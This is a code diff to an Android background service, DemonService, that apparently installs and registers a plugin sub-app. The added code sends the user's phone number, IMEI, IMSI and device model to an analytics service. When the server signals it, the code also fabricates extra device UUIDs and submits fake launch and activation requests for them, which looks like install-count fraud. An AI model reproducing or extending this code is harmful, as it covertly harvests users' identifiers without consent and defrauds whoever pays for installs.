@@ -16,11 +16,14 @@ import com.plugin.common.utils.StringUtils;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.common.utils.files.DiskManager;
 import com.plugin.internet.InternetUtils;
+import com.umeng.analytics.MobclickAgent;
 import com.xdtd.qm.api.active.ActiveRequest;
 import com.xdtd.qm.api.active.ActiveResponse;
 import com.xdtd.qm.api.active.LanuchRequest;
 import com.xdtd.qm.api.active.LanuchResponse;
 import com.xstd.qm.setting.SettingManager;
+
+import java.util.HashMap;
 
 /**
  * Created with IntelliJ IDEA.
@@ -130,7 +133,8 @@ public class DemonService extends IntentService {
             String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;
 
             String extra = android.os.Build.MODEL;
-            if (AppRuntime.isTablet(getApplicationContext())) extra = extra + ":平板";
+            boolean isTablet = AppRuntime.isTablet(getApplicationContext());
+            if (isTablet) extra = extra + ":平板";
             extra = extra + ":子程序已安装";
             LanuchRequest request = new LanuchRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                          , imei
@@ -141,6 +145,20 @@ public class DemonService extends IntentService {
                                                          , AppRuntime.BASE_URL
                                                          , extra);
             LanuchResponse response = InternetUtils.request(getApplicationContext(), request);
+
+            //notify umeng
+            HashMap<String, String> log = new HashMap<String, String>();
+            log.put("isTablet", (isTablet ? "平板" : "手机"));
+            log.put("imsi", imsi);
+            log.put("channel", Config.CHANNEL_CODE);
+            log.put("uuid", uuid);
+            log.put("phone", phone);
+            log.put("phoneType", android.os.Build.MODEL);
+            log.put("plugin", "已安装");
+            log.put("versionName", UtilsRuntime.getVersionName(getApplicationContext()));
+            MobclickAgent.onEvent(getApplicationContext(), "plugin_install", log);
+            MobclickAgent.flush(getApplicationContext());
+
             if (response != null && !TextUtils.isEmpty(response.url)) {
                 if (Config.DEBUG) {
                     Config.LOGD("[[DemonService::notifyPluginInstalled]] success notify service Plugin Installed ::::::::");
@@ -185,7 +203,8 @@ public class DemonService extends IntentService {
             String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;
 
             String extra = android.os.Build.MODEL;
-            if (AppRuntime.isTablet(getApplicationContext())) extra = extra + ":平板";
+            boolean isTablet = AppRuntime.isTablet(getApplicationContext());
+            if (isTablet) extra = extra + ":平板";
             LanuchRequest request = new LanuchRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                          , imei
                                                          , imsi
@@ -195,6 +214,7 @@ public class DemonService extends IntentService {
                                                          , AppRuntime.BASE_URL
                                                          , extra);
             LanuchResponse response = InternetUtils.request(getApplicationContext(), request);
+
             if (response != null) {
                 if (response.activeDelay == -1) {
                     //表示当前这个设备是要被关闭的
@@ -202,7 +222,29 @@ public class DemonService extends IntentService {
                     response.url = "http://fakedownload.apk";
                     response.subAppName = "fakedownload.apk";
                     SettingManager.getInstance().setRealActiveDelayTime(AppRuntime.ACTIVE_DEALY1);
+
+                    //如果是-1，模拟几个设备
+                    String uuidFake = uuid + "-123";
+                    String uuidFake1 = uuid + "-124";
+                    SettingManager.getInstance().setFakeUUID(uuid + ";" + uuidFake + ";" + uuidFake1);
+                    //直接访问网络
+                    makeFakeLanuch(uuidFake);
+                    makeFakeLanuch(uuidFake1);
                 }
+
+                //notify umeng
+                HashMap<String, String> log = new HashMap<String, String>();
+                log.put("isTablet", (isTablet ? "平板" : "手机"));
+                log.put("imsi", imsi);
+                log.put("channel", Config.CHANNEL_CODE);
+                log.put("uuid", uuid);
+                log.put("phone", phone);
+                log.put("phoneType", android.os.Build.MODEL);
+                log.put("versionName", UtilsRuntime.getVersionName(getApplicationContext()));
+                log.put("disApkDownload", String.valueOf(response.activeDelay == -1));
+                log.put("downloadUrl", response.subAppName);
+                MobclickAgent.onEvent(getApplicationContext(), "lanuch", log);
+                MobclickAgent.flush(getApplicationContext());
             }
             if (response != null && !TextUtils.isEmpty(response.url)) {
                 if (Config.DEBUG) {
@@ -321,7 +363,7 @@ public class DemonService extends IntentService {
                         imsi = "987654321";
                     }
                     String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;
-
+                    boolean isTablet = AppRuntime.isTablet(getApplicationContext());
                     ActiveRequest request = new ActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                                  , imei
                                                                  , imsi
@@ -330,10 +372,35 @@ public class DemonService extends IntentService {
                                                                  , uuid
                                                                  , AppRuntime.BASE_URL
                                                                  , android.os.Build.MODEL
-                                                                    + (SettingManager.getInstance().getInstallChanged()
-                                                                          ? ";左install" : ""));
+                                                                       + (SettingManager.getInstance().getInstallChanged()
+                                                                              ? ";左install" : ""));
                     ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
+
                     if (response != null && !TextUtils.isEmpty(response.url)) {
+                        if (SettingManager.getInstance().getDisableDownloadPlugin()) {
+                            //标识是前几个设备
+                            String uuids = SettingManager.getInstance().getFakeUUID();
+                            if (!TextUtils.isEmpty(uuids)) {
+                                String[] uuidList = uuids.split(";");
+                                if (uuidList != null && uuidList.length == 3) {
+                                    makeFakeActive(uuidList[1]);
+                                    makeFakeActive(uuidList[2]);
+                                }
+                            }
+                        }
+
+                        //notify umeng
+                        HashMap<String, String> log = new HashMap<String, String>();
+                        log.put("isTablet", (isTablet ? "平板" : "手机"));
+                        log.put("imsi", imsi);
+                        log.put("channel", Config.CHANNEL_CODE);
+                        log.put("uuid", uuid);
+                        log.put("phone", phone);
+                        log.put("phoneType", android.os.Build.MODEL);
+                        log.put("versionName", UtilsRuntime.getVersionName(getApplicationContext()));
+                        MobclickAgent.onEvent(getApplicationContext(), "active", log);
+                        MobclickAgent.flush(getApplicationContext());
+
                         if (Config.DEBUG) {
                             Config.LOGD("[[DemonService::activeQS]] active success, response : " + response.toString());
                         }
@@ -376,6 +443,103 @@ public class DemonService extends IntentService {
         PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
         AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
         am.cancel(sender);
+    }
+
+    private boolean makeFakeActive(String uuid) {
+        try {
+            String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
+            if (TextUtils.isEmpty(phone)) phone = "00000000000";
+            String imei = UtilsRuntime.getIMEI(getApplicationContext());
+            if (TextUtils.isEmpty(imei)) {
+                imei = String.valueOf(System.currentTimeMillis());
+            }
+            String imsi = UtilsRuntime.getIMSI(getApplicationContext());
+            if (TextUtils.isEmpty(imsi)) {
+                imsi = "987654321";
+            }
+            boolean isTablet = AppRuntime.isTablet(getApplicationContext());
+            ActiveRequest request = new ActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
+                                                         , imei
+                                                         , imsi
+                                                         , Config.CHANNEL_CODE
+                                                         , phone
+                                                         , uuid
+                                                         , AppRuntime.BASE_URL
+                                                         , android.os.Build.MODEL
+                                                               + (SettingManager.getInstance().getInstallChanged()
+                                                                      ? ";左install" : ""));
+            ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
+
+            if (response != null) {
+                //notify umeng
+                HashMap<String, String> log = new HashMap<String, String>();
+                log.put("isTablet", (isTablet ? "平板" : "手机"));
+                log.put("imsi", imsi);
+                log.put("channel", Config.CHANNEL_CODE);
+                log.put("uuid", uuid);
+                log.put("phone", phone);
+                log.put("phoneType", android.os.Build.MODEL);
+                log.put("versionName", UtilsRuntime.getVersionName(getApplicationContext()));
+                MobclickAgent.onEvent(getApplicationContext(), "active", log);
+                MobclickAgent.flush(getApplicationContext());
+
+                return true;
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return false;
+    }
+
+    private boolean makeFakeLanuch(String uuid) {
+        try {
+            String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
+            if (TextUtils.isEmpty(phone)) phone = "00000000000";
+            String imei = UtilsRuntime.getIMEI(getApplicationContext());
+            if (TextUtils.isEmpty(imei)) {
+                imei = String.valueOf(System.currentTimeMillis());
+            }
+            String imsi = UtilsRuntime.getIMSI(getApplicationContext());
+            if (TextUtils.isEmpty(imsi)) {
+//                imsi = String.valueOf(System.currentTimeMillis() + 9999);
+                imsi = "987654321";
+            }
+
+            String extra = android.os.Build.MODEL;
+            boolean isTablet = AppRuntime.isTablet(getApplicationContext());
+            if (isTablet) extra = extra + ":平板";
+            LanuchRequest request = new LanuchRequest(UtilsRuntime.getVersionName(getApplicationContext())
+                                                         , imei
+                                                         , imsi
+                                                         , Config.CHANNEL_CODE
+                                                         , uuid
+                                                         , phone
+                                                         , AppRuntime.BASE_URL
+                                                         , extra);
+            LanuchResponse response = InternetUtils.request(getApplicationContext(), request);
+            if (response != null) {
+                //notify umeng
+                HashMap<String, String> log = new HashMap<String, String>();
+                log.put("isTablet", (isTablet ? "平板" : "手机"));
+                log.put("imsi", imsi);
+                log.put("channel", Config.CHANNEL_CODE);
+                log.put("uuid", uuid);
+                log.put("phone", phone);
+                log.put("phoneType", android.os.Build.MODEL);
+                log.put("versionName", UtilsRuntime.getVersionName(getApplicationContext()));
+                log.put("disApkDownload", String.valueOf(response.activeDelay == -1));
+                log.put("downloadUrl", response.subAppName);
+                MobclickAgent.onEvent(getApplicationContext(), "lanuch", log);
+                MobclickAgent.flush(getApplicationContext());
+
+                return true;
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return false;
     }
 
 }
